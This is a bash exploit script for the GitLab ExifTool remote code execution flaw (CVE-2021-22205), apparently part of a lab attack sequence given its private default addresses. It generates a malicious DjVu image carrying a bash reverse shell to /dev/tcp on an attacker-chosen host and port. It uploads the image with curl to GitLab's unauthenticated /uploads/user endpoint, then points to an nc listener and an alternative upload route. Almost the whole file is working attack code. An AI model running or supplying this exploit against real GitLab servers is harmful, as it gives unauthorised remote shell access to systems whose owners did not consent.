#!/bin/bash
# GitLab ExifTool RCE (CVE-2021-22205)
# Usage: ./02-exiftool-rce.sh [GITLAB_HOST] [LHOST] [LPORT]

set -e

GITLAB_HOST="${1:-172.26.0.30}"
GITLAB_PORT=80
LHOST="${2:-172.26.0.10}"
LPORT="${3:-4445}"

PAYLOAD_DIR="/opt/payloads"
PAYLOAD_IMAGE="/tmp/exploit.jpg"

echo "[*] GitLab ExifTool RCE (CVE-2021-22205)"
echo "[*] Target: ${GITLAB_HOST}:${GITLAB_PORT}"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

# Step 1: Generate the malicious image
echo "[1/2] Generating malicious DjVu payload image..."
REVERSE_SHELL="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
python3 "$PAYLOAD_DIR/gen_payload_image.py" "$REVERSE_SHELL" "$PAYLOAD_IMAGE"

# Step 2: Upload to GitLab (unauthenticated endpoint)
echo "[2/2] Uploading payload to GitLab..."
echo ""

# The /uploads/user endpoint processes images with ExifTool without authentication
RESPONSE=$(curl -s -w "\n%{http_code}" \
  -F "file=@${PAYLOAD_IMAGE}" \
  "http://${GITLAB_HOST}:${GITLAB_PORT}/uploads/user")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "      HTTP Response: ${HTTP_CODE}"
echo "      Body: ${BODY}"
echo ""

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "422" ]; then
    echo "[*] Payload uploaded! GitLab will process it with ExifTool."
    echo "[*] If successful, reverse shell connects to ${LHOST}:${LPORT}"
    echo "[*] Start listener with: nc -lvnp ${LPORT}"
else
    echo "[!] Upload may have failed. Check GitLab logs."
    echo "[!] Alternative: try uploading via GitLab issue/snippet if this endpoint is restricted."
fi
